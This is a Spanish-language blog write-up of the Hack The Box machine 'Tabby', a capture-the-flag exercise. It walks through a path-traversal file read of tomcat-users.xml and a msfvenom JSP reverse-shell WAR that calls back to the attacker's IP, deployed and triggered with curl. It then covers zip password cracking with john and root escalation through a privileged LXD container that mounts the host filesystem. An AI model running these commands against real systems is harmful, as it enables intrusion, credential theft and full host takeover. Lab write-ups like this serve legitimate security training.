@@ -1,0 +1,262 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Tabby HTB - WriteUP // 0xl3mon💀</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://0xl3mon.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Tabby HTB - WriteUP"/>
+<meta name="twitter:description" content="Tabby - 10.129.5.1 Reconnossaince Nmap Recon Results Discovery OS System
+TTL = 63 -&gt; Linux System Recon Open Ports
+Service Enumeration
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA) | 256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA) |_ 256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel nuestro resultado del escaneo de nmap nos revela que tenemos 3 puertos abiertos, 2 posibles servicios web , uno de ellos un tomcat9 y en el puerto 80 un servicio web que enumeraremos pronto."/>
+
+    <meta property="og:title" content="Tabby HTB - WriteUP" />
+<meta property="og:description" content="Tabby - 10.129.5.1 Reconnossaince Nmap Recon Results Discovery OS System
+TTL = 63 -&gt; Linux System Recon Open Ports
+Service Enumeration
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA) | 256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA) |_ 256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel nuestro resultado del escaneo de nmap nos revela que tenemos 3 puertos abiertos, 2 posibles servicios web , uno de ellos un tomcat9 y en el puerto 80 un servicio web que enumeraremos pronto." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xl3mon.github.io/posts/htb/tabby-htb-writeup/" />
+<meta property="article:published_time" content="2022-03-27T16:32:01+02:00" />
+<meta property="article:modified_time" content="2022-03-27T16:32:01+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://0xl3mon.github.io/"><img class="app-header-avatar" src="/avatar/panda-rose.jpg" alt="John Doe" /></a>
+      <h1>0xl3mon💀</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>ℂ𝕪𝕓𝕖𝕣𝕊𝕖𝕔𝕦𝕣𝕚𝕥𝕪 𝔹𝕝𝕠𝕘 </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/0xl3mon" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/rodrigo-flores-36847a233/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Tabby HTB - WriteUP</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 27, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="tabby---1012951">Tabby - 10.129.5.1</h1>
+<h2 id="reconnossaince">Reconnossaince</h2>
+<h3 id="nmap-recon-results">Nmap Recon Results</h3>
+<p><strong>Discovery OS System</strong></p>
+<p><img src="https://i.imgur.com/a3VrSMk.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">TTL = 63 -&gt; Linux System
+</code></pre></div><p><strong>Recon Open Ports</strong></p>
+<p><img src="https://i.imgur.com/5bYjesh.png" alt=""></p>
+<p><strong>Service Enumeration</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp   open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+</code></pre></div><p>nuestro resultado del escaneo de nmap nos revela que tenemos 3 puertos abiertos, 2 posibles servicios web , uno de ellos un tomcat9 y en el puerto 80 un servicio web que enumeraremos pronto.</p>
+<p><code>nmap --script http-enum -p 8080 10.129.69.215 -T4 -n -oN http-enum</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PORT     STATE SERVICE
+8080/tcp open  http-proxy
+| http-enum: 
+|   /examples/: Sample scripts
+|   /manager/html/upload: Apache Tomcat <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> <span style="color:#f92672">)</span>
+|   /manager/html: Apache Tomcat <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> <span style="color:#f92672">)</span>
+|_  /docs/: Potentially interesting folder
+
+</code></pre></div><p>aplicando fuerza bruta a traves del script nse &ldquo;http-enum&rdquo;  para enumerar posibles directorios.</p>
+<h3 id="enumeration">Enumeration</h3>
+<p><strong>Web Services</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://10.129.5.1/
+</code></pre></div><p><img src="https://i.imgur.com/L3Ovf4e.png" alt="AltText|1200"></p>
+<p>enumerando el sitio web,  en la seccion <strong>&ldquo;News&rdquo;</strong> notamos que hace uso de un  parametro <strong>&ldquo;File&rdquo;</strong> del que intentaremos aprovecharnos en el caso de que las entradas no esten bien sanitizada.</p>
+<p><img src="https://i.imgur.com/3YE8VT9.png" alt="AltText|1200"></p>
+<h3 id="explotation">Explotation</h3>
+<p><strong>Directory Traversal</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://megahosting.htb/news.php?file=../../../../../../../../../..//etc/passwd&gt; 
+</code></pre></div><p><img src="https://i.imgur.com/jZpQzD9.png" alt="AltText">
+consiente de que podemos aprovecharnos de un LFI en el servicio web por el puerto 80  enumeraremos recursos potencialmente utiles, por ejemplo el fichero de configuracion de tomcat para listar credenciales validas&hellip;</p>
+<p><img src="https://i.imgur.com/urRBFxF.png" alt="AltText|1200">
+entonces sabemos que el systema de tomcat esta instalado en la siguiente ruta <code>/usr/share/tomcat</code>  y que posiblemente el fichero &ldquo;tomcat-users.xml&rdquo; se encuentre dentro de dicho directorio, para eso instalaremos una version de tomcat 9 en un contenedor de docker y buscaremos el fichero para saber concretamente en que ruta se encuentra.</p>
+<ul>
+<li>Docker Container</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">apt install tomcat9
+find / -type f -iname <span style="color:#e6db74">&#34;tomcat-users.xml&#34;</span>
+</code></pre></div><p><img src="https://i.imgur.com/300mjKr.png" alt=""></p>
+<p>nuestro poximo paso sera listar el fichero a traves del LFI.</p>
+<p><img src="https://i.imgur.com/fwETUbh.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">- Valid Credentials
+	- tomcat : $3cureP4s5w0rd123!
+</code></pre></div><p>una vez que nos logueamos en el servicio web http://10.129.69.215:8080/manager/html  obtenemos un 403 - Prohibido</p>
+<p><img src="https://i.imgur.com/ZApMl5c.png" alt=""></p>
+<p>probablemente solo nos podemos loguear al servicio de manera local, o sea desde el lado del servidor&hellip; pero  leimos con anterioridad que habia otro servicio que nos ayudaba a manejar las instancias de tomcat  que era &ldquo;host-manager-webapp&rdquo;</p>
+<p><img src="https://i.imgur.com/fkWelxI.png" alt=""></p>
+<p>Encontramos un interesante <a href="https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/">Recurso</a> donde muestra distintas variantes de explotacion de tomcat, pero desafortunadamente este poc es en windows (aunque lo intentamos no tenemos suerte).</p>
+<p>Googleando de igual manera llegamos <a href="https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00">Exploiting Apache Tomcat manager-script role</a></p>
+<p>En la <a href="http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands">documentacion</a> de tomcat dice que podemos subir un fichero &ldquo;war&rdquo; a traves de forma remota aunque no podamos loguearnos de forma grafica.</p>
+<p><img src="https://i.imgur.com/F7eXIMp.png" alt="AltText"></p>
+<p>Googleando podemos dar con unas <a href="https://gist.github.com/pete911/6111816">instrucciones</a> en git de como subir y desplegar el archivo</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># deploy under &#34;path&#34; context path</span>
+curl --upload-file appplication-0.1-1.war <span style="color:#e6db74">&#34;http://tomcat:tomcat@localhost:8080/manager/deploy?path=/application-0.1-1
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"># undeploy
+</span><span style="color:#e6db74">curl &#34;</span>http://tomcat:tomcat@localhost:8080/manager/undeploy?path<span style="color:#f92672">=</span>/application-0.1-1<span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">#(!tomcat7 uses /manager/text/undeploy and /manager/text/deploy paths)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"># !tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed
+</span><span style="color:#e6db74"># tomcat-users.xml has to be setup with user that has admin, manager and manager-script roles
+</span></code></pre></div><p>realizamos una pequeña prueba para saber si el recurso en donde queremos subir nuestro fichero war existe</p>
+<p><img src="https://i.imgur.com/5kgmggK.png" alt="">
+Asi que nos crearemos un fichero war con msfvenom y procedemos a subir el fichero</p>
+<p><strong>Generating War File</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Creando war rev shell)</span>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.31 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f war --platform linux -a x64 -o shell.war
+<span style="color:#75715e">#(Uploading the war file )</span>
+curl -u <span style="color:#e6db74">&#34;tomcat:</span>$3<span style="color:#e6db74">cureP4s5w0rd123!&#34;</span> http://10.129.156.191:8080/manager/text/deploy?path<span style="color:#f92672">=</span>/lemon --upload-file shell.war
+</code></pre></div><p>los parametros son:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">- -u &#39;tomcat:$3cureP4s5w0rd123!&#39;  #Credenciales
+- /manager/text/deploy - ruta  
+- ?path=/lemon - la ruta en la que quiero que viva la aplicación
+- --upload-file shell.war - archivo war que cargaremos con curl a traves del metodo PUT en HTTP
+</code></pre></div><p><img src="https://i.imgur.com/vACL5dq.png" alt=""></p>
+<p>una vez desplegada nuestra aplicacion , ahora identificaremos cual es nuestro archivo jsp, que ejecutara nuestra reverse shell</p>
+<p><code>jar -ft shell.war</code></p>
+<p><img src="https://i.imgur.com/mw6qstW.png" alt="">
+ahora podemos realizar nuestra peticion get para que sea interpretado en el lado del servidor y obtengamos nuestra conexion reversa</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl -u <span style="color:#e6db74">&#34;tomcat:\$3cureP4s5w0rd123\!&#34;</span> <span style="color:#e6db74">&#34;http://10.129.156.191:8080/lemon/djabvojwvgpm.jsp&#34;</span>
+</code></pre></div><p><img src="https://i.imgur.com/gTe06AV.png" alt=""></p>
+<h3 id="priv-esc">Priv Esc</h3>
+<p>Enumerando el sistema nos damos cuenta que en el directorio <code>/var/www/html/</code> existe un fichero llamado  <strong>&ldquo;13162020_backup.zip&rdquo;</strong> que se ve interesante</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ls -lRa
+</code></pre></div><p><img src="https://i.imgur.com/zJu8TcA.jpg" alt="AltText|600">
+entonces transferiremos este fichero a nuestra maquina local</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Convert the zip file in base64)</span>
+base64 16162020_backup.zip
+
+<span style="color:#75715e">#(copy with tmux)</span>
+CTRL + <span style="color:#f92672">[</span>
+CTRL + space   // start <span style="color:#66d9ef">select</span>
+CTRL + w 	  // copy
+CTRL + <span style="color:#f92672">]</span>     // paste
+
+</code></pre></div><p>entonces abrimos un fichero en nano pegamos el buffer de tmux y decodeamos, para asegurar la intergridad de la data hacemos un checkeo  de hashes en md5sum</p>
+<p><img src="https://i.imgur.com/cJpZFRX.png" alt="AltText">
+cuando queremos desconprimir el fichero nos pide un passphrase , como lo desconocemos le aplicaremos fuerza bruta  pero antes que eso lo pasamos a formato john</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Format to john)</span>
+zip2john backup-ash.zip &gt; backup2john
+
+<span style="color:#75715e">#(cracking with john)</span>
+john --wordlists<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt backup2john
+</code></pre></div><p><img src="https://i.imgur.com/LUdYHP5.png" alt=""></p>
+<ul>
+<li>Valid Credential
+<ul>
+<li><code>Ash : admin@it</code></li>
+</ul>
+</li>
+</ul>
+<p><img src="https://i.imgur.com/jGc0Hhi.png" alt=""></p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>enumerando el sistema nos damos cuenta de que estamos en el grupo  <strong>(lxd)</strong> que basicamente es una tecnologia de linux para desplegar contenedores, de la que podemos abusar</p>
+<p>googleando damos con el recurso de book hacktricks en donde explica distintos metodos para escalar privilegios, asi que en este caso utilizaremos el segundo metodo</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
+<span style="color:#75715e"># Build an Alpine image and start it using the flag security.privileged=true, forcing the container to interact as root with the host filesystem.</span>
+
+ 
+1.  build a simple alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+
+2.  Build the image
+./build-alpine
+
+3. Transfer the file and import
+
+lxc image import alpine.tar.gz --alias alpine-image  <span style="color:#75715e"># It&#39;s important doing this from YOUR HOME directory on the victim machine, or it might fail.</span>
+
+// we can list the image 
+lxc image list
+
+4. before running the image, start and configure the lxd storage pool as default 
+lxd init
+
+5. run the image
+lxc init alpine-image lemon-container -c security.privileged<span style="color:#f92672">=</span>true
+
+6.  mount the /root into the image
+lxc config device add lemon-container mydevice disk source<span style="color:#f92672">=</span>/ path<span style="color:#f92672">=</span>/mnt/root recursive<span style="color:#f92672">=</span>true
+
+// we can list container 
+lxc list
+
+<span style="color:#75715e"># interact with the container</span>
+lxc start lemon-container
+lxc exec lemon-container /bin/sh
+
+</code></pre></div><p><img src="https://i.imgur.com/YnZzRMV.png" alt=""></p>
+<p>bien una vez que tenemos montada el directorio <code>/root</code> en  nuestro container podemos realizar distintas tecnicas de explotacion como por ejp. agregar una llave id_rsa para loguearse como root, o agregarle permisos <strong>suid</strong> al binario bash, entre otras cosas.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
